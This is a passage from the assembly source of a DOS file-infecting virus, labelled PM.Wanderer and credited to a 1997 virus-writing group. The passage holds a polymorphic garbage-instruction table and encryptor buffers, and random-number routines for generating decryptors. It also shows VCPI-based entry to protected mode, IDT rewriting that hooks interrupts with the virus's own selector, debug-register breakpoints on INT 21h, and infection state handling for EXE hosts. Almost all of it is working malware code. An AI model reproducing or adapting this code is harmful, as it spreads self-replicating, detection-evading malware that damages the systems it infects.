                   db      0FFh
                   db      F_I_REG + 0
                   db      90h

   ; ROL,ROR,RCL,... reg,1
                   db      12h
                   db      0FFh
                   db      F_I_OP_REG + 1
                   db      0D1h
                   db      0C0h

   ; NOP or XCHG AX,reg :  This entry is duplicated !?
                   db      11h
                   db      0FFh
                   db      F_I_REG + 0
                   db      90h

   ; NEG reg :
                   db      12h
                   db      0FFh
                   db      F_I_REG + 1
                   db      0F7h
                   db      0D8h

   ; CMP xx,reg :
                   db      12h
                   db      0FFh
                   db      F_I_REGRMMOD + 1
                   db      38h
                   db      0

   ; MOV reg,xxxx :
                   db      23h
                   db      0FFh
                   db      F_I_REG + 0
                   db      F_G_WORD + 1
                   db      0B8h
                   db      0
                   db      0

   ; INC reg :
                   db      11h
                   db      0FFh
                   db      F_I_REG + 0
                   db      40h

   ; IN AL,xx :
                   db      12h
                   db      0FFh
                   db      F_G_BYTE + 1
                   db      0E4h
                   db      0

   ; MOV reg8,[xxxx] :
                   db      24h
                   db      0FFh
                   db      F_I_REG_PRESERVE_MODRM + 1
                   db      F_G_WORD + 2
                   db      8Ah
                   db      6
                   db      0
                   db      0

   ; CMP byte ptr [reg+(reg)+imm16],imm8 :
                   db      35h
                   db      0FFh
                   db      F_I_RM + 1
                   db      F_G_WORD + 2
                   db      F_G_BYTE + 4
                   db      80h
                   db      0B8h
                   db      0
                   db      0
                   db      0

   ; NOT reg :
                   db      12h
                   db      0FFh
                   db      F_I_REG + 1
                   db      0F7h
                   db      0D0h

   ; OR reg,...
                   db      12h
                   db      0FFh
                   db      F_I_REGRMMOD + 1
                   db      0Ah
                   db      0

                   db      4Eh             ; End of garbage table mark


   jmp_ofs         db      0
                   db      0               ; Wasted byte!
   garbagetogen    dw      0
   reg_sp          db      4               ; SP register
   reg_counter     db      81h
   indexreg_op2    db      86h
                   db      80h             ; Wasted byte!
   in_loop         db      0


   initialize_random_seed:
           pusha
           mov     ah,2Ch
           call    int_21h         ; Get current time
                   mov     cs:random1,cx   ; Hours + minutes
                   mov     cs:random2,dx   ; Seconds + hundredths of second
           popa
           ret

   get_n_random:           ; Returns pseudo-random value in [0..(AX-1)]
           pusha
           call    get_random
           mov     bx,sp
           mov     cx,dx
           mul     word ptr ss:[bx+0Eh]
           mov     ax,cx
           mov     cx,dx
           mul     word ptr ss:[bx+0Eh]
           add     ax,cx
           adc     dx,0
           mov     ss:[bx+0Eh],dx
           popa
           ret

   get_random:
                   mov     ax,cs:random1
                   mov     bx,cs:random2
           mov     cx,ax
                   mul     cs:mult_const
           shl     cx,3
           add     ch,cl
           add     dx,cx
           add     dx,bx
           shl     bx,2
           add     dx,bx
           add     dh,bl
           shl     bx,5
           add     dh,bl
           add     ax,1
           adc     dx,0
                   mov     cs:random1,ax
                   mov     cs:random2,dx
           ret


   mult_const      dw      8405h
   random1         dw      0
   random2         dw      0
   encryptor_ptr   dw      offset(end_encryptor)
   ofs_endencryptor dw     offset(end_encryptor)


   kill_copy4infection:
                   call    set_ds
           mov     ax,ss
           mov     es,ax
                   mov     esi,cs:page_1
                   mov     ds:[esi+infecting],0    ; Can infect again
           assume  cs:data0
                   mov     esp,cs:_esp
           assume  cs:wanderer
           mov     edi,esp
                   mov     ecx,STACK_SIZE/4
           cld
                   db      0F3h,66h,67h,0A5h       ; rep movsd (TASM FIX)
                                                   ; Restore stack
           push    ds
           pop     es
           xor     ebp,ebp
                   mov     esi,90h ; Restore pages allocated by infection procedure
   l_restore_pages:
                   mov     edx,cs:old_pages[ebp*4]
                   call    map_page
                   inc     esi             ; Next 4KB
                   inc     bp              ; Next page
                   cmp     bp,3            ; old_page1,2 and 3 restored?
                   jne     l_restore_pages ; No? then jmp
   exit_21h:
           xor     ax,ax
           mov     ds,ax
           mov     es,ax
           popad
                   iretd                   ; Return to original caller

   ; Format of a Page Table Entry
   ;
   ;   31                                  12 11                      0
   ;  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÑÍÍÍÑÍÑÍÑÍÍÍÑÍÑÍÑÍ»
   ;  º                                      ³       ³   ³ ³ ³   ³U³R³ º
   ;  º      PAGE FRAME ADDRESS 31..12       ³ AVAIL ³0 0³D³A³0 0³/³/³Pº
   ;  º                                      ³       ³   ³ ³ ³   ³S³W³ º
   ;  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÍÍÍÏÍÍÍÏÍÏÍÏÍÍÍÏÍÏÍÏÍ¼
   ;
   ;   P      - PRESENT
   ;   R/W    - READ/WRITE
   ;   U/S    - USER/SUPERVISOR
   ;   D      - DIRTY
   ;   AVAIL  - AVAILABLE FOR SYSTEMS PROGRAMMER USE
   ;   NOTE: 0 INDICATES INTEL RESERVED. DO NOT DEFINE.

   map_page:
                   mov     edi,cs:pagetable
                   mov     ebx,[edi][esi*4]        ; Read page in page table
           mov     dl,67h
                   mov     [edi][esi*4],edx        ; Store new page in page table
           mov     eax,cr3
           mov     cr3,eax
           ret

   setup_system_regs:
                   movzx   ebx,ds:virus_cs
           shl     ebx,4
                   add     ebx,offset(GDTR)        ; Calculate GDTR phys address
                   mov     ds:addr_GDTR,ebx
                   add     ebx,IDTR-GDTR           ; Calculate IDTR phys address
                   add     ds:addr_IDTR,ebx
                   mov     cx,ds:addr_dir_page
           mov     es,cx
           shr     cx,8
                   mov     ax,0DE06h    ; VCPI - Get dir page phys addr in 1st MB
                   call    VCPI
                   mov     ds:_CR3,edx  ; EDX = physical address of dir page
           mov     ax,0DE06h    ; VCPI - Get phys addr of page in 1st MB
           mov     cx,es
           shr     cx,8
                   inc     cx              ; Addr of page table
                   call    VCPI
                   or      dl,7            ; User level, read-write, present
                   mov     es:[0],edx      ; Store page table in page directory
           ret

   VCPI:
           int     67h             ;  - LIM EMS
           and     ah,ah           ; Error or VCPI not present ?
           jz      no_ems_error    ; No? then jmp
           pop     ax
                   jmp     exec_host
   no_ems_error:
           ret

   ;
   ;   DATA SEGMENT DESCRIPTOR
   ;
   ;    31                23                15                7               0
   ;   ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÑÍÑÍÑÍÑÍÍÍÍÍÍÍÍÍØÍÑÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;   º                 ³ ³ ³ ³A³ LIMIT   ³ ³     ³  TYPE   ³                 º
   ;   º   BASE 31..24   ³G³B³0³V³ 19..16  ³P³ DPL ³         ³   BASE 23..16   º 4
   ;   º                 ³ ³   ³L³         ³ ³     ³1³0³E³W³A³                 º
   ;   ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÅÄÁÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
   ;   º                                   ³                                   º
   ;   º        SEGMENT BASE 15..0         ³        SEGMENT LIMIT 15..0        º 0
   ;   º                                   ³                                   º
   ;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   ;
   ;   EXECUTABLE SEGMENT DESCRIPTOR
   ;
   ;    31                23                15                7               0
   ;   ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÑÍÑÍÑÍÑÍÍÍÍÍÍÍÍÍØÍÑÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;   º                 ³ ³ ³ ³A³ LIMIT   ³ ³     ³  TYPE   ³                 º
   ;   º   BASE 31..24   ³G³D³0³V³ 19..16  ³P³ DPL ³         ³   BASE 23..16   º 4
   ;   º                 ³ ³ ³ ³L³         ³ ³     ³1³0³C³R³A³                 º
   ;   ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÅÄÁÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
   ;   º                                   ³                                   º
   ;   º        SEGMENT BASE 15..0         ³        SEGMENT LIMIT 15..0        º 0
   ;   º                                   ³                                   º
   ;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   ;
   ;
   ;   DESCRIPTORS USED FOR SPECIAL SYSTEM SEGMENTS
   ;
   ;    31                23                15                7               0
   ;   ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÑÍÑÍÑÍÑÍÍÍÍÍÍÍÍÍØÍÑÍÍÍÍÍÑÍÑÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;   º                 ³ ³ ³ ³A³         ³ ³     ³ ³       ³                 º
   ;   º   BASE 31..24   ³G³X³O³V³ LIMIT   ³P³ DPL ³0³  TYPE ³  BASE 23..16    º 4
   ;   º                 ³ ³ ³ ³L³ 19..16  ³ ³     ³ ³       ³                 º
   ;   ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÁÄÁÄÁÄÁÄÄÄÄÄÄÄÄÄÅÄÁÄÄÄÄÄÁÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
   ;   º                                   ³                                   º
   ;   º        SEGMENT BASE 15..0         ³       SEGMENT LIMIT 15..0         º 0
   ;   º                                   ³                                   º
   ;   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   ;
   ;
   ;        A   - ACCESSED                              E   - EXPAND-DOWN
   ;        AVL - AVAILABLE FOR PROGRAMMERS USE         G   - GRANULARITY
   ;        B   - BIG                                   P   - SEGMENT PRESENT
   ;        C   - CONFORMING                            R   - READABLE
   ;        D   - DEFAULT                               W   - WRITABLE
   ;        DPL - DESCRIPTOR PRIVILEGE LEVEL
   ;
   ; System and Gate descriptor types :
   ;
   ; Code     Type of Segment or Gate
   ;  0       -reserved
   ;  1       Available 286 TSS
   ;  2       LDT
   ;  3       Busy 286 TSS
   ;  4       Call Gate
   ;  5       Task Gate
   ;  6       286 Interrupt Gate
   ;  7       286 Trap Gate
   ;  8       -reserved
   ;  9       Available 386 TSS
   ;  A       -reserved
   ;  B       Busy 386 TSS
   ;  C       386 Call Gate
   ;  D       -reserved
   ;  E       386 Interrupt Gate
   ;  F       386 Trap Gate


   build_descriptor:
                                           ; AX = descriptor
                                           ; CX = base address
                                           ; BX = limit
                                           ; DX = rights
                   movzx   eax,ax
                   mov     [esi][eax],bx   ; Limit 15..0
           shr     ebx,10h
                   mov     [esi+2][eax],cx ; Base 15..0
           shr     ecx,10h
                   mov     [esi+4][eax],cl ; Base 23..16
                   mov     [esi+5][eax],dl ; Type, DPL, P,...
           and     bl,0Fh
           or      dh,bl
                   mov     [esi+6][eax],dh ; Limit 19..16, AVL, G,...
                   mov     [esi+7][eax],ch ; Base 31..24
           ret

   set_breakpoints:
                   mov     eax,cs:i21h_ep
                   mov     dr0,eax         ; Address for breakpoint 0 (int 21h)
                   mov     eax,0FE05Bh     ; BIOS address: near jump to reboot
                   mov     dr1,eax         ; Address for breakpoint 1
           xor     eax,eax
                   mov     dr6,eax ; Clear dr6 (the processor never clears it)
                   mov     eax,00000000000000000000001000001010b
   ;                                                       ^ ^
   ;                                                       2 breakpoints (globals)
           mov     dr7,eax
           ret

   set_ds:
           mov     ax,cs
                   add     ax,8
           mov     ds,ax
           ret


   ;  80386 INTERRUPT GATE
   ;  31                23                15                7                0
   ;  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÑÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍ»
   ;  º           OFFSET 31..16           ³ P ³DPL³0 1 1 1 0³0 0 0³(NOT USED) º4
   ;  ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÁÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄ¶
   ;  º             SELECTOR              ³           OFFSET 15..0            º0
   ;  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   ;
   ;  80386 TRAP GATE
   ;  31                23                15                7                0
   ;  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÑÍÍÍÑÍÍÍÍÍÍÍÍÍØÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍ»
   ;  º          OFFSET 31..16            ³ P ³DPL³0 1 1 1 1³0 0 0³(NOT USED) º4
   ;  ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÁÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄ¶
   ;  º             SELECTOR              ³           OFFSET 15..0            º0
   ;  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

   build_idt_descriptor:           ; On entry:
                                   ;       ECX = interrupt number
                                   ;       AX  = address of service routine
                                   ;       DI  = address to store orig int & sel
                   mov     esi,es:IDT_base         ; Access to IDT
                   mov     bx,[esi+6][ecx*8]       ; Offset 31..16
           shl     ebx,10h
                   mov     bx,[esi][ecx*8]         ; Offset 15..0
                   mov     es:[di],ebx             ; Save original int
                   mov     bx,[esi+2][ecx*8]       ; Get selector
                   mov     es:[di+4],bx            ; Save original selector
                   mov     bx,es:virus_selector
                   mov     [esi+2][ecx*8],bx       ; Set new selector
                   mov     [esi][ecx*8],ax         ; Set new interrupt (15..0)
                   mov     word ptr [esi+6][ecx*8],0       ;           (31..16)
           ret

   system_registers:
   _CR3            dd      0
   addr_GDTR       dd      0
   addr_IDTR       dd      0
   LDTR            dw      0
   TR              dw      TSS_SEL                 ; TSS selector
   pm_EIP          dd      offset(pm_entry_point)  ; Protected mode EIP
   pm_CS           dw      CODE_SEL                ; Protected mode CS selector

   GDTR:
   limit_gdt       dw      47h
   base_gdt        dd      0

   IDTR:
   limit_idt       dw      0FFFFh
   base_idt        dd      0

   host_type       db      0
   codesegment     dw      0
   pm_ep           dd      0
                   dw      VCPICS_SEL

   virus_end:

   size_mcb        dw      ?
   orig_i1         dd      ?
   sel_i1          dw      ?
   orig_i9         dd      ?
   sel_i9          dw      ?
   i21h_ep         dd      ?
   virus_cs        dw      ?
   virus_selector  dw      ?

   pages_4K:
   page_1          dd      ?
   page_2          dd      ?
   page_3          dd      ?
   page_4          dd      ?

   old_pages       dd      ?
   old_page2       dd      ?
   old_page3       dd      ?

   addr_dir_page   dw      ?
   infecting       db      ?
   pagetable       dd      ?

   GDT:
   GDT_limit       dw      ?
   GDT_base        dd      ?

   IDT:
   IDT_limit       dw      ?
   IDT_base        dd      ?


   org 1000h
   BUFFER_SIZE     =       1000h
   _stack:
   buffer1:
                   db      BUFFER_SIZE dup(?)
   buffer2:

   header:
   signature       dw      ?
   image_size      dw      ?
   pages           dw      ?
   relo_items      dw      ?
   header_size     dw      ?
   mim_mem         dw      ?
   max_mem         dw      ?
   stack_seg       dw      ?
   stack_ofs       dw      ?
   checksum        dw      ?
   val_ip          dw      ?
   val_cs          dw      ?
   ofs_reloc       dw      ?
   overlays        dw      ?

   wanderer        ends


   data0           segment use16
   org 0
                   db      STACK_SIZE dup(?)       ; Stack
   _esp            dd      ?
                   db      3Ch dup(?)              ; Buffer for encryptor
   end_encryptor   db      ?
                   db      0Fh dup(?)              ; Buffer for encryptor
   psp_seg         dw      ?
   filetime        dw      ?
   filedate        dw      ?
   previous_ofs    dw      ?
   mask_dec_ofs    dw      ?
   mask_enc_ofs    dw      ?
   ofs_loop_begin  dw      ?
   decryptor_size  dw      ?
   max_garbage     dw      ?
                   dd      ?
   ptr_select_reg  dw      ?
   code_size       dw      ?
   operations      db      ?
   indexreg_op1    db      ?
                   dw      ?
   delta_ofs       dw      ?
   enc_buffer      dw      ?
   unused_reg      db      ?
   saved_sp        dw      ?
   saved_ss        dw      ?

   org 0F0h
   copy_code       =       $

   data0           ends
           end    start

   ; End of PM.Wanderer disassembly
   ; (c) 1997, Tcp/29A (tcp@cryogen.com)
